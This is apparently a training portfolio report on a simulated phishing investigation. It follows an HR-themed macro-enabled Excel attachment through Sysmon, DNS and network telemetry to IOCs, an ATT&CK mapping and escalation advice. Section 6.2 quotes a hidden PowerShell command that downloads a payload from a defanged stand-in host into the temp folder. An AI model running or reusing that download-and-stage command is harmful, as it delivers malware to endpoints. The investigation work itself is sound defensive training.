# Phishing Incident Investigation
## Case 01 — The Unexpected HR Document

<p align="center">
  <strong>SOC Analyst Portfolio | Phishing Investigation</strong>
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Investigation-Phishing-red">
  <img src="https://img.shields.io/badge/Difficulty-Beginner%20to%20Intermediate-blue">
  <img src="https://img.shields.io/badge/Focus-SOC%20Tier%201-purple">
  <img src="https://img.shields.io/badge/Status-Escalated-orange">
</p>

---

## 1. Case Information

| Field | Details |
|---|---|
| Case ID | 01 |
| Case Name | The Unexpected HR Document |
| Analyst | Nada Abdella |
| Investigation Type | Phishing Email & Suspicious Attachment |
| Difficulty | Beginner → Intermediate |
| Role Perspective | SOC Tier 1 Analyst |
| Environment | Simulated Enterprise Environment |
| Incident Priority | High |
| Investigation Status | Escalated — Further Analysis Required |

> **Disclaimer:** This is a simulated educational investigation. All domains, IP addresses, users, and events are fictional training data. No real organization or user information is included.

---

# PART I — INVESTIGATION REPORT

## 2. Executive Summary

An HR employee reported a suspicious email containing an Excel macro-enabled attachment named `Employee_Review.xlsm`.

The email claimed to be related to employee data verification and urged the recipient to review the attached document.

Following the reported opening of the attachment, endpoint telemetry recorded suspicious process activity involving Excel, PowerShell, and CMD.

A PowerShell command attempted to download an external file named `update.dat` into the user's temporary directory.

Additional telemetry recorded an outbound connection from PowerShell to an external IP address, a DNS query for `cdn-update.example`, and a subsequent `rundll32.exe` event associated with `update.dat`.

The combination of a suspicious email, a macro-enabled attachment, suspicious PowerShell activity, an external download attempt, and subsequent process activity indicates a high-confidence suspicious execution chain.

However, the available evidence does not independently confirm the downloaded file's malicious functionality, the exact execution chain, persistence, data exfiltration, or command-and-control activity.

**Assessment:** High-confidence suspicious activity requiring urgent escalation to Tier 2 / Incident Response.

**Recommended Priority:** High.

**Recommended Immediate Action:** Isolate the affected endpoint, preserve forensic evidence, investigate the downloaded file, and assess the potential exposure of other recipients.

---

## 3. Incident Overview

### 3.1 Scenario

An employee from the HR department received an email claiming to originate from HR Management.

The message requested urgent employee data verification and included an Excel macro-enabled attachment.

The employee opened the attachment. Subsequent endpoint telemetry recorded suspicious PowerShell activity and an external network connection.

The investigation aims to determine:

- Whether the email was malicious.
- Whether the attachment triggered suspicious execution.
- What actions PowerShell attempted to perform.
- Whether an external payload was successfully downloaded and executed.
- Whether the endpoint was compromised.
- What additional evidence is required to establish the incident's scope and impact.

### 3.2 Affected Assets

| Asset | Details |
|---|---|
| Affected Endpoint | HR-PC-07 |
| Affected User | HR\User01 |
| Department | Human Resources |
| Initial Delivery Method | Phishing Email |
| Attachment | Employee_Review.xlsm |
| Suspected Downloaded File | update.dat |
| External IP | 198.51.100.25 |
| Suspicious Domain | cdn-update.example |

---

## 4. Email Investigation

### 4.1 Email Metadata

| Field | Observed Value |
|---|---|
| From | hr-management@company-support.example |
| To | user01@company.example |
| Subject | Urgent: Employee Data Verification |
| Date | 15 November 2026 |
| Attachment | Employee_Review.xlsm |
| Attachment Size | 48 KB |
| SPF | PASS |
| DKIM | FAIL |
| DMARC | FAIL |
| Reply-To | hr-verification@external-mail.example |

### 4.2 Suspicious Indicators

**1. Email Authentication Results**

- SPF returned PASS.
- DKIM returned FAIL.
- DMARC returned FAIL.

SPF PASS does not establish that the sender is trustworthy. It only indicates that the sending server passed the SPF authorization check for the evaluated domain.

DKIM FAIL and DMARC FAIL require further investigation because they indicate that the message did not successfully satisfy the relevant authentication and alignment requirements.

**2. Reply-To Mismatch**

The displayed sender and Reply-To addresses belong to different domains:

- From: `company-support.example`
- Reply-To: `external-mail.example`

This mismatch could indicate an attempt to redirect replies to an external address.

It is suspicious but does not independently prove phishing.

**3. Social Engineering**

The subject uses urgency and an HR-related request to encourage the employee to open the attachment.

### 4.3 Additional Email Evidence Required

- Full email headers.
- Complete Received header chain.
- Message-ID.
- Original sending IP address.
- Full Authentication-Results header.
- Return-Path.
- Comparison with legitimate HR communications.
- Mail gateway delivery and campaign information.

**Email Assessment:**

The message contains multiple suspicious indicators and should be treated as a suspected phishing email pending further validation.

The available information does not conclusively establish the sender's identity or prove deliberate email spoofing.

---

## 5. Attachment Investigation

### 5.1 Attachment Information

| Field | Value |
|---|---|
| Filename | Employee_Review.xlsm |
| File Type | Excel Macro-Enabled Workbook |
| Size | 48 KB |
| SHA256 | a7c93e...91f2 |
| User Interaction | File opened |
| Macro Presence | Macros present |

### 5.2 Security Risks

XLSM files can contain VBA macros that automate actions within Microsoft Excel.

Depending on their content and execution context, malicious macros may:

- Launch external processes.
- Execute PowerShell or CMD commands.
- Download additional files.
- Modify files or registry settings.
- Initiate further stages of an attack.

However, the presence of macros does not automatically mean that the file is malicious.

Similarly, opening an XLSM file does not prove that its macros executed.

### 5.3 Observed Execution-Related Activity

Following the attachment opening, the supplied telemetry recorded PowerShell and CMD process creation.

This activity is suspicious in the context of the reported email and attachment.

However, direct evidence linking the macro to PowerShell execution is still required.

### 5.4 Additional Attachment Evidence Required

- Full SHA256 hash.
- VBA macro source code.
- Static file analysis.
- Macro execution telemetry.
- File creation and modification events.
- Process IDs and Parent Process IDs.
- Relevant Microsoft Office security logs.

**Attachment Assessment:**

The attachment is suspicious because it contains macros and was followed by suspicious endpoint activity.

The exact relationship between the macro and subsequent process execution requires further verification.

---

## 6. Endpoint Investigation

### 6.1 Observed Process Activity

The following events were provided by Sysmon telemetry:

| Timestamp | Process / Event | Observation |
|---|---|---|
| 09:44:10 | EXCEL.EXE | Process creation |
| 09:46:32 | powershell.exe | Process creation |
| 09:46:33 | cmd.exe | Process creation |
| 09:46:35 | PowerShell Network Activity | Connection to external IP |
| 09:47:02 | DNS Query | cdn-update.example |
| 09:47:10 | rundll32.exe | Recorded parent process: update.dat |

### 6.2 PowerShell Command Analysis

Observed command:

```powershell
powershell.exe -NoProfile -WindowStyle Hidden -Command "Invoke-WebRequest -Uri hxxps://cdn-update.example/payload.dat -OutFile $env:TEMP\update.dat"
```

#### Command Breakdown

| Component | Function |
|---|---|
| powershell.exe | Launches PowerShell |
| -NoProfile | Prevents loading the user's PowerShell profile |
| -WindowStyle Hidden | Attempts to run the PowerShell window in a hidden state |
| Invoke-WebRequest | Sends a web request and retrieves content |
| -Uri | Specifies the remote resource |
| -OutFile | Specifies the local output file |
| $env:TEMP | References the user's temporary directory |
| update.dat | Intended output filename |

#### Interpretation

The command attempts to retrieve a remote resource and save it as `update.dat` in the user's temporary directory.

This is consistent with a possible payload download stage.

The command confirms an attempted download operation. It does not independently prove that the download completed successfully or that the downloaded file was malicious.

### 6.3 Process Relationship Analysis

Process relationships help establish how processes were initiated.

Illustrative process tree:

```text
EXCEL.EXE
    |
    +---- powershell.exe
                |
                +---- cmd.exe
```

This is an illustrative process tree, not a fully confirmed reconstruction of every parent-child relationship in the supplied evidence.

A verified relationship between Excel and PowerShell would strengthen the hypothesis that the attachment initiated the suspicious activity.

The original evidence does not provide all required Parent Process IDs and Process IDs.

### 6.4 rundll32.exe Investigation

The supplied evidence records:

- Process: `rundll32.exe`
- Recorded parent process: `update.dat`
- User: `HR\User01`

This is suspicious because it appears after the attempted file download.

However, the record requires clarification.

A normal process parent should be another process, not simply a file. The original event may be describing a process image, command line, or another relationship rather than a verified parent process.

Additional information is required:

- Raw process creation event.
- Process ID.
- Parent Process ID.
- Parent process image.
- Full command line.
- Loaded module information.
- File metadata for `update.dat`.

It is not currently possible to conclude that rundll32.exe established a C2 connection or successfully executed a malicious DLL.

### 6.5 Endpoint Assessment

The endpoint contains strong indicators of suspicious execution and download activity.

Further investigation is required to determine whether the downloaded file executed successfully and whether additional malicious actions occurred.

---

## 7. Network Investigation

### 7.1 Observed Network Indicators

| Indicator | Value |
|---|---|
| Source Endpoint | HR-PC-07 |
| Process | powershell.exe |
| Destination IP | 198.51.100.25 |
| Destination Port | 443 |
| Protocol | TCP |
| DNS Query | cdn-update.example |
| Requested Resource | /payload.dat |

### 7.2 Network Activity Analysis

PowerShell initiated a network connection to an external IP address over TCP port 443.

The command line also references a resource hosted at:

`cdn-update.example/payload.dat`

A DNS query for the same domain was recorded.

These events are consistent with an attempt to retrieve an external file.

However, the available evidence does not include the DNS response, complete network flow details, or HTTP response data.

Therefore, the exact relationship between the DNS query and the destination IP should be verified using additional logs.

### 7.3 Why HTTPS Does Not Establish Trust

HTTPS protects the communication channel through TLS encryption.

It does not establish that the destination is legitimate or safe.

Malicious infrastructure can also use HTTPS.

### 7.4 Additional Network Evidence Required

- DNS query response and resolved IP.
- Firewall logs.
- Proxy logs.
- HTTP request and response metadata.
- TLS certificate information.
- Connection duration and transferred bytes.
- PCAP or network flow records.
- Additional connections from the affected endpoint.
- Historical reputation and threat intelligence for real indicators.

**Network Assessment:**

The observed network activity is suspicious and consistent with an external download attempt.

Command-and-control activity has not been established from the supplied evidence.

---

## 8. Investigation Timeline

| Time | Event | Evidence Source | Assessment |
|---|---|---|---|
| Before 09:44 | Suspicious email received | Email Evidence | Suspected phishing delivery |
| 09:44:10 | EXCEL.EXE process creation | Sysmon | Excel activity observed |
| 09:46:32 | PowerShell process creation | Sysmon | Suspicious process activity |
| 09:46:33 | CMD process creation | Sysmon | Additional process activity |
| 09:46:35 | PowerShell connects to 198.51.100.25:443 | Network Telemetry | Suspicious outbound connection |
| 09:47:02 | DNS query for cdn-update.example | DNS Telemetry | Domain lookup observed |
| 09:47:10 | rundll32.exe event involving update.dat | Endpoint Telemetry | Requires raw event validation |

**Timeline Limitation:**

The supplied data does not establish every process relationship or the exact completion time of the download.

The chronology supports investigation of a related execution chain but does not independently prove causality between every event.

---

## 9. Indicators of Compromise (IOCs)

| Type | Indicator | Context |
|---|---|---|
| Sender Address | hr-management@company-support.example | Suspicious email |
| Reply-To | hr-verification@external-mail.example | External reply destination |
| Sender Domain | company-support.example | Email investigation |
| Reply-To Domain | external-mail.example | Email investigation |
| Attachment | Employee_Review.xlsm | Macro-enabled attachment |
| Partial SHA256 | a7c93e...91f2 | Incomplete hash |
| Domain | cdn-update.example | PowerShell download URL |
| IP Address | 198.51.100.25 | External connection |
| File | update.dat | Intended downloaded file |
| Endpoint | HR-PC-07 | Affected endpoint |
| User | HR\User01 | Affected user |

### IOC Handling Notes

- The SHA256 value is incomplete and cannot be used for reliable hash matching.
- The IP and domains are training placeholders, not real threat intelligence indicators.
- The presence of an indicator does not automatically prove maliciousness.
- Each indicator should be classified according to its context and supporting evidence.

---

## 10. MITRE ATT&CK Mapping

The following mapping is based on the observed behavior and the limitations of the available evidence.

| Tactic | Technique | ID | Evidence / Confidence |
|---|---|---|---|
| Initial Access | Phishing: Spearphishing Attachment | T1566.001 | Suspected delivery method |
| Execution | User Execution: Malicious File | T1204.002 | Attachment was opened; malicious execution not independently proven |
| Execution | PowerShell | T1059.001 | PowerShell command execution observed |
| Command and Control / Transfer | Ingress Tool Transfer | T1105 | Candidate mapping; successful transfer needs verification |

### Mapping Limitations

MITRE ATT&CK mapping should describe observed or sufficiently supported adversary behavior.

The presence of `rundll32.exe` alone is insufficient to confirm:

- System Binary Proxy Execution: Rundll32 (T1218.011).
- Command and Control.
- Persistence.
- Credential Access.
- Exfiltration.

These techniques should only be added if further evidence supports them.

---

## 11. Incident Assessment

### 11.1 Overall Assessment

The incident contains multiple related indicators:

1. A suspicious HR-themed email.
2. DKIM and DMARC authentication failures.
3. A macro-enabled attachment.
4. Suspicious PowerShell and CMD process activity.
5. An attempted external file download.
6. An outbound network connection.
7. A subsequent rundll32.exe event requiring further validation.

Taken together, these findings indicate a high-confidence suspicious activity chain.

However, further evidence is needed to establish the downloaded file's functionality and the full extent of endpoint compromise.

### 11.2 Classification

**Recommended Classification:**

High-confidence suspicious execution and attempted payload download — urgent investigation required.

The activity can be considered a True Positive if the original SOC alert was specifically designed to detect the observed suspicious PowerShell download behavior.

However, the available evidence is insufficient to conclusively establish the full extent of endpoint compromise.

### 11.3 Potential Impact

Potential risks include:

- Execution of a malicious payload.
- Additional malware installation.
- Unauthorized access to the endpoint.
- Possible persistence.
- Potential communication with malicious infrastructure.
- Potential exposure of user or organizational information.

These are potential impacts, not confirmed outcomes.

### 11.4 Scope Assessment

Confirmed investigation scope:

- One reported HR email recipient.
- One affected endpoint: HR-PC-07.
- One reported user: HR\User01.
- One suspicious attachment.
- One observed external destination IP.
- One suspicious domain.

The wider organizational impact remains unknown.

---

## 12. Containment and Escalation Recommendations

### 12.1 Immediate Containment

1. Isolate HR-PC-07 from the corporate network using the available EDR or endpoint security controls.
2. Preserve forensic evidence before cleanup or remediation.
3. Retain Sysmon, EDR, DNS, firewall, and proxy logs.
4. Search the email gateway for the same message and attachment.
5. Identify all recipients and check whether other users opened the attachment.
6. Block confirmed malicious domains and infrastructure after validation.
7. Coordinate with Tier 2 / Incident Response before deleting files or rebuilding the endpoint.

### 12.2 Endpoint Investigation

- Obtain the full hash of `update.dat`.
- Identify the file type.
- Analyze the file in an isolated and authorized environment.
- Review process creation events and parent-child relationships.
- Check for suspicious registry modifications and scheduled tasks.
- Investigate loaded DLLs and memory artifacts if available.
- Review additional endpoint activity after the suspicious execution.

### 12.3 Identity and Credential Investigation

Although no credential theft is confirmed, the SOC should review:

- Unusual login activity.
- Authentication anomalies.
- New sessions.
- Account changes.
- Privilege changes.
- Suspicious access to sensitive resources.

If evidence indicates credential exposure, follow the organization's account recovery and credential reset procedures.

### 12.4 Escalation

Escalate to Tier 2 / Incident Response because the observed activity extends beyond a suspicious email and includes endpoint process execution and an external download attempt.

The escalation package should contain:

- Email details.
- Attachment metadata.
- Full process and command-line evidence.
- Network indicators.
- Timeline.
- Current assessment.
- Known evidence gaps.
- Actions already performed.

---

## 13. Evidence Limitations and Investigation Gaps

| Missing Evidence | Why It Matters |
|---|---|
| Full SHA256 hash | Reliable identification and threat intelligence matching |
| VBA macro source | Determines macro behavior |
| Full process tree | Establishes process execution relationships |
| Process IDs and Parent Process IDs | Confirms process ancestry |
| Raw rundll32 event | Clarifies the unusual parent-process record |
| update.dat file contents | Determines file type and potential malicious functionality |
| File creation telemetry | Confirms whether the download was written to disk |
| File execution evidence | Determines whether the downloaded file ran successfully |
| DNS response | Correlates the domain with a resolved IP |
| HTTP response details | Helps determine whether the requested resource was returned |
| PCAP / network flow | Provides additional communication details |
| EDR behavioral telemetry | Helps identify post-execution activity |
| Persistence evidence | Determines whether the activity survived a reboot or session |
| Memory artifacts | May reveal injected code or active malicious processes |
| Other recipient activity | Determines campaign scope |

> Missing evidence must not be treated as evidence that the activity did not occur.

---

## 14. Final Conclusion

The investigation identified a suspicious email containing a macro-enabled Excel attachment, followed by suspicious PowerShell and CMD activity.

PowerShell attempted to download an external file into the user's temporary directory and established an outbound connection to an external IP address.

Subsequent endpoint telemetry recorded a rundll32.exe event associated with the downloaded filename.

The combined evidence justifies urgent escalation and endpoint isolation.

However, further analysis is required to validate the complete process execution chain, determine the downloaded file's nature, confirm whether payload execution occurred, and establish the incident's full scope.

**Final Investigation Status:**

High-confidence suspicious activity — Escalated for further forensic investigation.

---

# PART II — SOC ANALYST LEARNING NOTES

## 15. Common Concepts That Can Be Confused

This section summarizes important distinctions that should be reviewed during future phishing investigations.

### 15.1 File Opened vs. Macro Executed vs. Payload Executed

| Event | What It Proves |
|---|---|
| File opened | The user opened the file |
| Macro executed | Macro code actually ran |
| PowerShell started | A PowerShell process was created |
| Download command executed | A download operation was attempted |
| File created | A file was written to disk |
| Payload executed | The downloaded file or payload actually ran |

**Remember:**

Opening a file is not proof of infection.

A process appearing after a file opens is not enough to prove causation.

### 15.2 PowerShell Execution vs. Malicious PowerShell Activity

PowerShell is a legitimate Windows administration tool.

It becomes suspicious when its behavior, command line, parent process, or network activity indicates potentially malicious activity.

Examples of suspicious behavior:

- Hidden execution.
- Unexpected external downloads.
- Encoded or obfuscated commands.
- Execution from unusual parent processes.
- Unusual file creation.
- Unexpected outbound communication.

No single keyword should automatically determine the verdict.

### 15.3 Download Attempt vs. Successful Download vs. Execution

| Evidence | Appropriate Conclusion |
|---|---|
| Invoke-WebRequest in command line | Download attempt |
| Successful HTTP response | Resource returned by server |
| File creation event | File written locally |
| Matching file hash | Identifies the written file |
| Process creation / execution telemetry | File or associated executable ran |
| Behavioral evidence | Helps establish what the executed payload did |

A download command alone does not prove that a payload was successfully delivered or executed.

### 15.4 External Connection vs. C2

An external connection can be caused by many legitimate and malicious activities.

To classify traffic as C2, look for supporting evidence such as:

- Repeated beaconing.
- Suspicious command-and-control patterns.
- Threat intelligence associations.
- Unusual request/response behavior.
- Evidence of remote tasking or control.
- Related endpoint behavior.

**An unfamiliar external IP is suspicious, not automatically C2.**

### 15.5 True Positive vs. Confirmed Compromise

| Term | Meaning |
|---|---|
| True Positive | The detection correctly identified the behavior it was designed to detect |
| False Positive | The alert fired on benign activity |
| Suspicious Activity | Activity that requires further investigation |
| Confirmed Compromise | Sufficient evidence establishes unauthorized or malicious compromise |

A True Positive alert does not always mean the entire endpoint was compromised.

### 15.6 Authentication vs. Sender Trust

| Mechanism | What It Checks | What It Does Not Prove |
|---|---|---|
| SPF | Sending server authorization | Sender's overall trustworthiness |
| DKIM | Cryptographic message signature | That the content is safe |
| DMARC | Domain alignment and policy evaluation | That the message is benign |
| HTTPS | Encrypted communication | Destination legitimacy |

### 15.7 Parent Process vs. Process Name

A process name alone is not enough.

For example, `rundll32.exe` is a legitimate Windows binary that can also be abused.

Investigate:

- Parent process.
- Parent PID.
- Process ID.
- Command line.
- Loaded modules.
- File path.
- User context.
- Network activity.

The same executable can be benign or malicious depending on context.

---

## 16. Important Questions to Ask During Every Phishing Investigation

### Email Investigation

- Who sent the email?
- Does the sender domain match the expected organization?
- Do SPF, DKIM, and DMARC pass?
- Is Reply-To different?
- Is the message urgent or unusual?
- Is there an attachment or a URL?
- Who else received the same message?

### Attachment Investigation

- What is the file extension?
- What is the real file type?
- Does it contain macros?
- Was the file opened?
- Is there evidence of macro execution?
- Was another process launched?
- What is the full file hash?

### Endpoint Investigation

- Which process started?
- What was its parent process?
- What was the command line?
- Which user executed it?
- Was a file downloaded?
- Was the file executed?
- Did it create persistence?
- Were there further suspicious events?

### Network Investigation

- Which process initiated the connection?
- What was the destination IP and domain?
- Was DNS resolution successful?
- Was data transferred?
- What was the HTTP response?
- Is the destination known to be malicious?
- Was there repeated communication?

### Incident Assessment

- What is confirmed?
- What is suspected?
- What is unknown?
- What is the affected scope?
- Is containment required?
- Should the case be escalated?
- What additional evidence would change the verdict?

---

## 17. Additional Evidence Request Checklist

When the available evidence is incomplete, do not guess. Request the specific evidence needed to answer the investigation questions.

### Priority 1 — Immediate Investigation

- [ ] Full SHA256 of the original attachment.
- [ ] Full SHA256 of `update.dat`, if the file exists.
- [ ] Raw Sysmon Event ID 1 process creation records.
- [ ] Process IDs and Parent Process IDs.
- [ ] Full command line for PowerShell, CMD, and rundll32.exe.
- [ ] File creation telemetry for `update.dat`.
- [ ] EDR process tree.
- [ ] Firewall and proxy connection records.

### Priority 2 — Payload Analysis

- [ ] Original XLSM file in an authorized isolated analysis environment.
- [ ] Extracted VBA macro source.
- [ ] File type and metadata for `update.dat`.
- [ ] Static analysis results.
- [ ] Sandboxed behavioral analysis, if authorized.
- [ ] Module load events.
- [ ] Relevant memory artifacts.

### Priority 3 — Scope and Persistence

- [ ] Search for the same attachment hash across endpoints.
- [ ] Search for the same file name and suspicious command line.
- [ ] Search for the suspicious domain and IP across network logs.
- [ ] Review scheduled tasks.
- [ ] Review suspicious registry modifications.
- [ ] Review newly created services.
- [ ] Check other recipients of the original email.
- [ ] Review account activity for the affected user.

### Priority 4 — Network and Threat Intelligence

- [ ] DNS query and response records.
- [ ] PCAP or network flow data.
- [ ] HTTP response metadata.
- [ ] TLS certificate metadata.
- [ ] Connection duration and bytes transferred.
- [ ] Historical domain and IP reputation.
- [ ] Related threat intelligence reports.

---

## 18. Evidence-Based Reporting Language

Use precise language in SOC reports.

| Avoid Saying | Prefer Saying |
|---|---|
| The file infected the machine | Suspicious activity was observed after the file was opened |
| The macro executed | Macro execution requires further verification |
| Malware was downloaded | The command attempted to download a file |
| The payload executed | Payload execution has not yet been independently confirmed |
| The IP is C2 | An outbound connection to the IP was observed |
| The endpoint is fully compromised | The endpoint shows high-confidence suspicious activity |
| All users are affected | The email was delivered to multiple recipients; their impact is unknown |
| The device is clean | No additional suspicious activity was found in the available telemetry |

---

## 19. Investigation Workflow

A repeatable workflow for future phishing cases:

1. **Identify:** Understand the reported email and initial indicators.
2. **Validate:** Examine sender authentication, headers, URLs, and attachments.
3. **Correlate:** Connect user activity with endpoint, process, and network telemetry.
4. **Establish:** Separate confirmed activity from hypotheses.
5. **Scope:** Identify affected users, devices, and infrastructure.
6. **Contain:** Recommend appropriate containment and evidence preservation.
7. **Escalate:** Provide Tier 2 with a clear timeline, IOCs, findings, and evidence gaps.
8. **Document:** Produce a report that another analyst can independently review.

---

## 20. Analyst Self-Assessment

Before closing a phishing investigation, confirm that you can answer these questions:

- [ ] Can I explain why the email is suspicious?
- [ ] Can I explain what SPF, DKIM, and DMARC actually establish?
- [ ] Can I distinguish opening a file from executing its contents?
- [ ] Can I read a PowerShell command and explain its behavior?
- [ ] Can I identify the parent-child process relationship?
- [ ] Can I distinguish a download attempt from a successful download?
- [ ] Can I distinguish external communication from confirmed C2?
- [ ] Can I identify which conclusions are supported by evidence?
- [ ] Can I explain what evidence is missing?
- [ ] Can I recommend containment without destroying forensic evidence?
- [ ] Can I write a clear incident assessment without overstating the impact?

---

## 21. Portfolio Learning Outcomes

Through this investigation, the following skills were practiced:

- Email authentication analysis.
- Phishing indicator identification.
- Macro-enabled attachment assessment.
- PowerShell command-line analysis.
- Process execution correlation.
- Parent-child process investigation.
- DNS and network activity correlation.
- IOC extraction.
- MITRE ATT&CK mapping.
- Incident classification.
- Evidence gap identification.
- SOC escalation and containment recommendations.
- Professional incident report writing.

---

## 22. Safety and Investigation Disclaimer

This case uses simulated training data.

- Do not open suspicious samples on a primary personal device.
- Do not execute unknown files.
- Do not enter real credentials into suspicious websites.
- Do not contact simulated or suspicious infrastructure.
- Use isolated and authorized environments for malware analysis.
- Never publish confidential logs, customer information, or protected organizational evidence.

**Portfolio Note:** This report demonstrates a structured educational investigation and should not be presented as evidence of a real-world incident response engagement.
